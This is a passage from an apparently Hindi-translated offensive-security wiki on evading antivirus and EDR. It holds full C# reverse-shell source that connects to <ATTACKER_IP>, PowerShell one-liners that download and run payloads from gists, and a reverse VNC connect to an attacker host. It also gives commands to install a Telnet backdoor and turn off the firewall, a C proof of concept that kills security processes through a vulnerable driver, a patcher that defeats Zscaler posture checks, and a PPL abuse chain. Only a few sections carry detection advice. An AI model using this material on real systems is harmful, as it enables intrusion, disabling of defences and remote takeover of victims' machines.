3.  Proxy-call stripping – ConfuserEx decompilation को और कठिन बनाने के लिए direct method calls को lightweight wrappers (जिन्हें *proxy calls* भी कहा जाता है) से replace करता है। इन्हें **ProxyCall-Remover** से remove करें:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
इस step के बाद आपको opaque wrapper functions (`Class8.smethod_10`, …) के बजाय सामान्य .NET API जैसे `Convert.FromBase64String` या `AES.Create()` दिखाई देने चाहिए।

4.  Manual clean-up – resulting binary को dnSpy में run करें और *real* payload को locate करने के लिए large Base64 blobs या `RijndaelManaged`/`TripleDESCryptoServiceProvider` के उपयोग को search करें। अक्सर malware इसे एक TLV-encoded byte array के रूप में store करता है, जिसे `<Module>.byte_0` के अंदर initialize किया जाता है।

ऊपर दी गई chain malicious sample को run करने की आवश्यकता के बिना execution flow को restore करती है – offline workstation पर काम करते समय यह उपयोगी है।

> 🛈  ConfuserEx `ConfusedByAttribute` नाम का एक custom attribute बनाता है, जिसका उपयोग samples को automatically triage करने के लिए IOC के रूप में किया जा सकता है।

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): इस project का उद्देश्य [LLVM](http://www.llvm.org/) compilation suite का एक open-source fork प्रदान करना है, जो [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) और tamper-proofing के माध्यम से बढ़ी हुई software security प्रदान करने में सक्षम हो।
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator दर्शाता है कि `C++11/14` language का उपयोग करके, बिना किसी external tool और compiler को modify किए, compile time पर obfuscated code कैसे generate किया जा सकता है।
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework द्वारा generated obfuscated operations की एक layer जोड़ता है, जिससे application को crack करने की कोशिश करने वाले व्यक्ति का काम थोड़ा कठिन हो जाता है।
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz एक x64 binary obfuscator है, जो विभिन्न pe files को obfuscate कर सकता है, जिनमें शामिल हैं: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame arbitrary executables के लिए एक simple metamorphic code engine है।
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator LLVM-supported languages के लिए ROP (return-oriented programming) का उपयोग करने वाला fine-grained code obfuscation framework है। ROPfuscator regular instructions को ROP chains में transform करके assembly code level पर program को obfuscate करता है, जिससे normal control flow की हमारी स्वाभाविक समझ बाधित होती है।
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt Nim में लिखा गया एक .NET PE Crypter है
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor मौजूदा EXE/DLL को shellcode में convert करके उन्हें load कर सकता है

## SmartScreen & MoTW

कुछ executables को internet से download करके execute करते समय आपने यह screen देखी होगी।

Microsoft Defender SmartScreen एक security mechanism है, जिसका उद्देश्य end user को potentially malicious applications चलाने से सुरक्षित रखना है।

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen मुख्य रूप से reputation-based approach के साथ काम करता है, जिसका अर्थ है कि uncommon download applications SmartScreen को trigger करेंगी, जिससे end user को alert किया जाएगा और file execute करने से रोका जाएगा (हालांकि More Info -> Run anyway पर click करके file को अभी भी execute किया जा सकता है)।

**MoTW** (Mark of The Web) एक [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) है, जिसका नाम Zone.Identifier है। यह internet से files download करने पर automatically create होता है और इसमें उस URL की जानकारी भी होती है, जहाँ से इसे download किया गया था।

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Internet से download की गई file के लिए Zone.Identifier ADS की जाँच करना।</p></figcaption></figure>

> [!TIP]
> यह ध्यान रखना महत्वपूर्ण है कि **trusted** signing certificate से signed executables **SmartScreen को trigger नहीं करेंगे**।

अपने payloads को Mark of The Web प्राप्त करने से रोकने का एक बहुत प्रभावी तरीका उन्हें ISO जैसे किसी container के अंदर package करना है। ऐसा इसलिए होता है क्योंकि Mark-of-the-Web (MOTW) को **non NTFS** volumes पर लागू **नहीं** किया जा सकता।

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) एक ऐसा tool है, जो Mark-of-the-Web से बचने के लिए payloads को output containers में package करता है।

उदाहरण उपयोग:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
यहाँ [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) का उपयोग करके payloads को ISO files के अंदर package करके SmartScreen bypass करने का demo दिया गया है।

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) Windows में एक शक्तिशाली logging mechanism है, जो applications और system components को **events log** करने की अनुमति देता है। हालाँकि, security products इसका उपयोग malicious activities को monitor और detect करने के लिए भी कर सकते हैं।

AMSI को disable (bypass) करने के समान, user space process के **`EtwEventWrite`** function को इस तरह modify करना भी संभव है कि वह कोई भी event log किए बिना तुरंत return कर जाए। यह memory में function को patch करके किया जाता है, जिससे उस process के लिए ETW logging प्रभावी रूप से disable हो जाती है।

आपको **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) और [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** पर अधिक जानकारी मिल सकती है।


## C# Assembly Reflection

C# binaries को memory में load करना काफी समय से ज्ञात है और यह अभी भी अपने post-exploitation tools को AV की पकड़ में आए बिना चलाने का एक बहुत अच्छा तरीका है।

क्योंकि payload सीधे memory में load होगा और disk को touch नहीं करेगा, इसलिए हमें केवल पूरे process के लिए AMSI patch करने की चिंता करनी होगी।

अधिकांश C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, आदि) पहले से ही C# assemblies को सीधे memory में execute करने की सुविधा प्रदान करते हैं, लेकिन ऐसा करने के अलग-अलग तरीके हैं:

- **Fork\&Run**

इसमें **एक नया sacrificial process spawn करना**, अपने post-exploitation malicious code को उस नए process में inject करना, अपने malicious code को execute करना और समाप्त होने पर नए process को kill करना शामिल है। इसके कुछ फायदे और नुकसान दोनों हैं। fork and run method का लाभ यह है कि execution हमारे Beacon implant process के **बाहर** होता है। इसका अर्थ है कि यदि हमारी post-exploitation action में कुछ गलत हो जाता है या वह पकड़ी जाती है, तो हमारे **implant के survive करने की संभावना** काफी अधिक होती है। इसका नुकसान यह है कि **Behavioural Detections** द्वारा पकड़े जाने की **संभावना अधिक** होती है।

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

इसमें post-exploitation malicious code को **अपने ही process में** inject करना शामिल है। इस तरह आप नया process बनाने और उसे AV द्वारा scan करवाने से बच सकते हैं, लेकिन इसका नुकसान यह है कि यदि आपके payload के execution में कुछ गलत हो जाता है, तो **आपका beacon खोने की संभावना** काफी अधिक होती है, क्योंकि वह crash हो सकता है।

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> यदि आप C# Assembly loading के बारे में अधिक पढ़ना चाहते हैं, तो इस article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) और उनके InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) को देखें।

आप C# Assemblies को **PowerShell से** भी load कर सकते हैं। [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) और [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) देखें।

## Using Other Programming Languages

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) में प्रस्तावित तरीके के अनुसार, compromised machine को **Attacker Controlled SMB share पर installed interpreter environment** तक access देकर अन्य languages का उपयोग करके malicious code execute करना संभव है।

SMB share पर Interpreter Binaries और environment तक access देकर आप compromised machine की **memory के भीतर इन languages में arbitrary code execute** कर सकते हैं।

Repo के अनुसार: Defender अभी भी scripts को scan करता है, लेकिन Go, Java, PHP आदि का उपयोग करके हमारे पास **static signatures को bypass करने की अधिक flexibility** होती है। इन languages में random un-obfuscated reverse shell scripts के साथ testing सफल रही है।

## TokenStomping

Token stomping एक ऐसी technique है जो attacker को **access token या EDR अथवा AV जैसे security product में हेरफेर** करने की अनुमति देती है, जिससे वे इसके privileges कम कर सकते हैं ताकि process समाप्त न हो, लेकिन उसके पास malicious activities की जाँच करने की permissions भी न हों।

इसे रोकने के लिए Windows **external processes को security processes के tokens के handles प्राप्त करने से** रोक सकता है।

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

[**इस blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) में बताए गए अनुसार, victim के PC पर Chrome Remote Desktop deploy करना और फिर उसका उपयोग करके उसे takeover करना तथा persistence बनाए रखना आसान है:
1. https://remotedesktop.google.com/ से download करें, "Set up via SSH" पर click करें, और फिर MSI file download करने के लिए Windows वाली MSI file पर click करें।
2. Victim में installer को silently run करें (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop page पर वापस जाएँ और next पर click करें। Wizard आपसे authorize करने के लिए कहेगा; जारी रखने के लिए Authorize button पर click करें।
4. दिए गए parameter को कुछ adjustments के साथ execute करें: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (pin param पर ध्यान दें, जो GUI का उपयोग किए बिना pin set करने की अनुमति देता है)।


## Advanced Evasion

Evasion एक बहुत जटिल विषय है। कभी-कभी आपको केवल एक system में telemetry के कई अलग-अलग sources को ध्यान में रखना पड़ता है, इसलिए mature environments में पूरी तरह undetected रहना लगभग असंभव है।

आप जिस भी environment के विरुद्ध जाते हैं, उसकी अपनी strengths और weaknesses होंगी।

मैं आपको [@ATTL4S](https://twitter.com/DaniLJ94) की यह talk देखने की अत्यधिक सलाह देता हूँ, ताकि आप अधिक Advanced Evasion techniques की बेहतर समझ प्राप्त कर सकें।


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

यह [@mariuszbit](https://twitter.com/mariuszbit) की Evasion in Depth के बारे में एक और बेहतरीन talk है।


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

आप [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) का उपयोग कर सकते हैं, जो binary के parts को तब तक **remove करेगा जब तक यह पता न लगा ले कि Defender किस part को** malicious मान रहा है और उसे आपके लिए split कर दे।\
इसी **काम को करने वाला एक अन्य tool** [**avred**](https://github.com/dobin/avred) है, जो [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) पर यह service open web के माध्यम से प्रदान करता है।

### **Telnet Server**

Windows10 तक, सभी Windows versions में एक **Telnet server** आता था, जिसे (administrator के रूप में) इस command से install किया जा सकता था:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
सिस्टम शुरू होने पर इसे **start** करें और इसे अभी **run** करें:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet port बदलें** (stealth) और firewall अक्षम करें:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

इसे यहां से Download करें: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (आपको setup नहीं, बल्कि bin downloads चाहिए)

**ON THE HOST**: _**winvnc.exe**_ को Execute करें और server configure करें:

- _Disable TrayIcon_ option को Enable करें
- _VNC Password_ में password set करें
- _View-Only Password_ में password set करें

फिर binary _**winvnc.exe**_ और **newly** बनाई गई file _**UltraVNC.ini**_ को **victim** के अंदर move करें

#### **Reverse connection**

**attacker** को अपने **host** के अंदर binary `vncviewer.exe -listen 5900` **execute** करनी चाहिए, ताकि वह reverse **VNC connection** प्राप्त करने के लिए **prepared** रहे। फिर, **victim** के अंदर: winvnc daemon `winvnc.exe -run` Start करें और `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` run करें

**WARNING:** Stealth बनाए रखने के लिए आपको कुछ काम नहीं करने चाहिए

- अगर `winvnc` पहले से running है, तो उसे Start न करें, वरना [popup](https://i.imgur.com/1SROTTl.png) trigger होगा। `tasklist | findstr winvnc` से check करें कि यह running है या नहीं
- `UltraVNC.ini` को उसी directory में रखे बिना `winvnc` Start न करें, वरना [the config window](https://i.imgur.com/rfMQWcf.png) open हो जाएगी
- Help के लिए `winvnc -h` run न करें, वरना [popup](https://i.imgur.com/oc18wcu.png) trigger होगा

### GreatSCT

इसे यहां से Download करें: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT के अंदर:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
अब **lister शुरू करें** `msfconsole -r file.rc` का उपयोग करके और **xml payload** को इस प्रकार **execute** करें:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Current defender process को बहुत जल्दी terminate कर देगा।**

### अपना reverse shell Compile करना

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### पहला C# Revershell

इसे इससे Compile करें:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
इसे इसके साथ उपयोग करें:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# compiler का उपयोग
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatic download and execution:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators की सूची: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### injectors बनाने के लिए python का उपयोग: उदाहरण

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### अन्य tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Space से AV/EDR को समाप्त करना

Storm-2603 ने ransomware छोड़ने से पहले endpoint protections को disable करने के लिए **Antivirus Terminator** नामक एक छोटी console utility का उपयोग किया। यह अपने साथ एक **vulnerable लेकिन *signed* driver** लाता है और उसका दुरुपयोग करके privileged kernel operations जारी करता है, जिन्हें Protected-Process-Light (PPL) AV services भी block नहीं कर सकतीं।

मुख्य बातें
1. **Signed driver**: disk पर डिलीवर की गई file `ServiceMouse.sys` है, लेकिन binary Antiy Labs के “System In-Depth Analysis Toolkit” का legitimately signed driver `AToolsKrnl64.sys` है। क्योंकि driver पर valid Microsoft signature है, इसलिए Driver-Signature-Enforcement (DSE) enabled होने पर भी यह load हो जाता है।
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
पहली line driver को **kernel service** के रूप में register करती है और दूसरी उसे start करती है, जिससे `\\.\ServiceMouse` user land से accessible हो जाता है।
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID द्वारा किसी भी arbitrary process को terminate करना (Defender/EDR services को kill करने के लिए उपयोग किया जाता है) |
| `0x990000D0` | disk पर किसी भी arbitrary file को delete करना |
| `0x990001D0` | driver को unload करना और service को remove करना |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD user-mode protections को पूरी तरह bypass करता है; kernel में execute होने वाला code *protected* processes को open, terminate या kernel objects के साथ tamper कर सकता है, चाहे PPL/PP, ELAM या अन्य hardening features मौजूद हों।

Detection / Mitigation
• Microsoft की vulnerable-driver block list (`HVCI`, `Smart App Control`) enable करें, ताकि Windows `AToolsKrnl64.sys` को load करने से मना कर दे।
• नई *kernel* services के creation को monitor करें और तब alert करें जब कोई driver world-writable directory से load हो या allow-list में मौजूद न हो।
• Custom device objects के लिए user-mode handles के बाद होने वाली suspicious `DeviceIoControl` calls पर नज़र रखें।

### On-Disk Binary Patching के माध्यम से Zscaler Client Connector Posture Checks को Bypass करना

Zscaler का **Client Connector** device-posture rules को locally लागू करता है और results को अन्य components तक communicate करने के लिए Windows RPC पर निर्भर करता है। Design के दो कमजोर विकल्प full bypass को संभव बनाते हैं:

1. Posture evaluation **पूरी तरह client-side** होती है (server को एक boolean भेजा जाता है)।
2. Internal RPC endpoints केवल यह validate करते हैं कि connecting executable **Zscaler द्वारा signed** है (`WinVerifyTrust` के माध्यम से)।

**disk पर चार signed binaries को patch करके**, दोनों mechanisms को neutralise किया जा सकता है:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | हमेशा `1` return करता है, इसलिए हर check compliant होता है |
| `ZSAService.exe` | `WinVerifyTrust` को indirect call | NOP-ed ⇒ कोई भी (यहाँ तक कि unsigned) process RPC pipes से bind कर सकता है |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` से replace किया गया |
| `ZSATunnel.exe` | tunnel पर integrity checks | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
मूल files को replace करने और service stack को restart करने के बाद:

* **सभी** posture checks **green/compliant** दिखाई देते हैं।
* Unsigned या modified binaries named-pipe RPC endpoints (जैसे `\\RPC Control\\ZSATrayManager_talk_to_me`) खोल सकते हैं।
* Compromised host को Zscaler policies द्वारा defined internal network तक unrestricted access मिल जाता है।

यह case study दिखाती है कि केवल client-side trust decisions और simple signature checks को कुछ byte patches के साथ हराया जा सकता है।

## LOLBINs के साथ Protected Process Light (PPL) का दुरुपयोग करके AV/EDR से छेड़छाड़

Protected Process Light (PPL) एक signer/level hierarchy लागू करता है, ताकि केवल समान या उससे उच्च protected processes ही एक-दूसरे से छेड़छाड़ कर सकें। Offensive दृष्टिकोण से, यदि आप किसी PPL-enabled binary को वैध रूप से launch कर सकते हैं और उसके arguments को control कर सकते हैं, तो आप benign functionality (जैसे logging) को protected directories के विरुद्ध constrained, PPL-backed write primitive में बदल सकते हैं, जिनका उपयोग AV/EDR करते हैं।

किस वजह से कोई process PPL के रूप में run करता है
- Target EXE (और कोई भी loaded DLLs) PPL-capable EKU के साथ signed होने चाहिए।
- Process को इन flags के साथ CreateProcess का उपयोग करके create किया जाना चाहिए: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`।
- Binary के signer से match करने वाला compatible protection level request किया जाना चाहिए (जैसे anti-malware signers के लिए `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, और Windows signers के लिए `PROTECTION_LEVEL_WINDOWS`)। गलत levels creation पर fail हो जाएंगे।

PP/PPL और LSASS protection के व्यापक introduction के लिए यह भी देखें:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (protection level select करता है और arguments को target EXE तक forward करता है):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Signed system binary `C:\Windows\System32\ClipUp.exe` स्वयं spawn होता है और caller द्वारा निर्दिष्ट path पर log file लिखने के लिए एक parameter स्वीकार करता है।
- PPL process के रूप में launch किए जाने पर file write PPL backing के साथ होता है।
- ClipUp spaces वाले paths को parse नहीं कर सकता; सामान्य रूप से protected locations में point करने के लिए 8.3 short paths का उपयोग करें।

8.3 short path helpers
- Short names की सूची बनाएँ: प्रत्येक parent directory में `dir /x` चलाएँ।
- cmd में short path प्राप्त करें: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Launcher (जैसे CreateProcessAsPPL) का उपयोग करके `CREATE_PROTECTED_PROCESS` के साथ PPL-capable LOLBIN (ClipUp) launch करें।
2) Protected AV directory (जैसे Defender Platform) में file creation कराने के लिए ClipUp का log-path argument पास करें। आवश्यकता होने पर 8.3 short names का उपयोग करें।
3) यदि target binary AV के चलने के दौरान सामान्यतः open/locked रहती है (जैसे MsMpEng.exe), तो write को boot पर AV शुरू होने से पहले schedule करें। ऐसा auto-start service install करें जो विश्वसनीय रूप से पहले run हो। Process Monitor (boot logging) से boot ordering validate करें।
4) Reboot पर PPL-backed write AV द्वारा अपनी binaries को lock करने से पहले हो जाती है, जिससे target file corrupt हो जाती है और startup रुक जाता है।

Example invocation (सुरक्षा के लिए paths redacted/shortened):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- ClipUp द्वारा लिखी जाने वाली सामग्री को placement के अलावा नियंत्रित नहीं किया जा सकता; यह primitive सटीक content injection की बजाय corruption के लिए उपयुक्त है।
- किसी service को install/start करने और reboot window के लिए local admin/SYSTEM आवश्यक है।
- Timing महत्वपूर्ण है: target open नहीं होना चाहिए; boot-time execution file locks से बचाता है।

Detections
- असामान्य arguments के साथ `ClipUp.exe` का Process creation, विशेष रूप से boot के आसपास non-standard launchers द्वारा parent किए जाने पर।
- Suspicious binaries को auto-start करने के लिए configured नई services, जो Defender/AV से पहले लगातार start होती हों। Defender startup failures से पहले service creation/modification की जाँच करें।
- Defender binaries/Platform directories पर file integrity monitoring; protected-process flags वाले processes द्वारा की गई unexpected file creations/modifications।
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` के साथ बनाए गए processes और non-AV binaries द्वारा anomalous PPL level usage की तलाश करें।

Mitigations
